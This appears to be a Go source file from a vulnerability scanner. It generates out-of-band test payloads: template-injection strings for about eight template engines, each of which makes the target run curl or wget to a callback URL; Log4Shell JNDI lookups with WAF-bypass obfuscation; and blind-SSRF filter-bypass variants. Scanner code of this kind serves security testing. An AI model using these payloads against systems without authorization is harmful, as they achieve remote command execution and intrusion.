package scanner

// Extended out-of-band (OAST) payload sets — the "wide coverage" additions that
// connect the remaining blind vulnerability classes to the same token-correlated
// callback infrastructure the core OAST scanner already uses. Every payload here
// is designed so that a SINGLE outbound callback to /oob/<token> (HTTP) or the
// raw JNDI/LDAP listener proves execution with ZERO visible in-band signal —
// exactly the class that error/timing/boolean checks and signature matchers miss
// behind a WAF, in a stored/second-order sink, or when the response is discarded.

// sstiOOBPayloads builds Server-Side Template Injection payloads across the major
// template engines that force the engine to RUN a command fetching our callback.
// A callback proves blind SSTI→RCE — the in-band ssti.go module only catches the
// arithmetic-reflection case ({{7*7}}→49); this catches templates whose evaluated
// output is never rendered back (logged, emailed, queued, or WAF-stripped).
//
// cb is the full http callback URL (http://host/oob/<token>).
func sstiOOBPayloads(cb string) []string {
	c := "curl -s " + cb
	w := "wget -qO- " + cb
	return []string{
		// Python — Jinja2 (two globals paths, engines differ on which is reachable)
		"{{lipsum.__globals__.os.popen('" + c + "').read()}}",
		"{{cycler.__init__.__globals__.os.popen('" + c + "').read()}}",
		// Python — Mako
		"${__import__('os').popen('" + c + "').read()}",
		// PHP — Twig (filter/map to system)
		"{{['" + c + "']|filter('system')}}",
		"{{['" + c + "','']|map('system')|join}}",
		// PHP — Smarty
		"{php}system('" + c + "');{/php}",
		// Node — Nunjucks / Pug (child_process via the range/global constructor)
		"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('" + c + "')\")()}}",
		// Ruby — ERB / Slim
		"<%= `" + c + "` %>",
		"<%= system('" + c + "') %>",
		// Java — Freemarker
		"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"" + c + "\")}",
		// Java — Spring SpEL / generic EL
		"${T(java.lang.Runtime).getRuntime().exec('" + c + "')}",
		"#{T(java.lang.Runtime).getRuntime().exec('" + w + "')}",
	}
}

// log4ShellParamPayloads builds JNDI Log4Shell (CVE-2021-44228) payloads for
// injection into WEB parameters — the original, dominant exploitation vector that
// the network initial-access engine only sprays through headers. cb is the bare
// host:rawport/token the target's Log4j LDAP/RMI client connects back to (caught
// by the raw OOB listener and correlated in api.RecordOOBHit). Includes the
// standard case-mangling / nested-lookup WAF bypasses.
func log4ShellParamPayloads(cb string) []string {
	return []string{
		"${jndi:ldap://" + cb + "}",
		"${${lower:j}ndi:${lower:l}dap://" + cb + "}",
		"${jndi:rmi://" + cb + "}",
		"${jndi:${lower:l}${lower:d}ap://" + cb + "}",
		"${jndi:dns://" + cb + "}",
	}
}

// ssrfOOBPayloads returns the blind-SSRF values for a URL/host parameter: the
// direct callback plus the scheme/encoding variants a naive allow-list or
// "must-start-with-https" filter still lets through. All share one token, so any
// single callback attributes to this injection point. host is bare host[:port].
func ssrfOOBPayloads(cb, host string) []string {
	path := ""
	if i := indexByteFrom(cb, '/', len("http://")); i >= 0 {
		path = cb[i:]
	}
	return []string{
		cb,                       // http://host/oob/<token>
		"https://" + host + path, // https variant
		"//" + host + path,       // protocol-relative
		cb + "#",                 // trailing-fragment filter bypass
	}
}

// indexByteFrom is strings.IndexByte starting at offset `from` (returns an
// absolute index, or -1). Kept local to avoid pulling strings into a payload file.
func indexByteFrom(s string, b byte, from int) int {
	if from < 0 {
		from = 0
	}
	for i := from; i < len(s); i++ {
		if s[i] == b {
			return i
		}
	}
	return -1
}
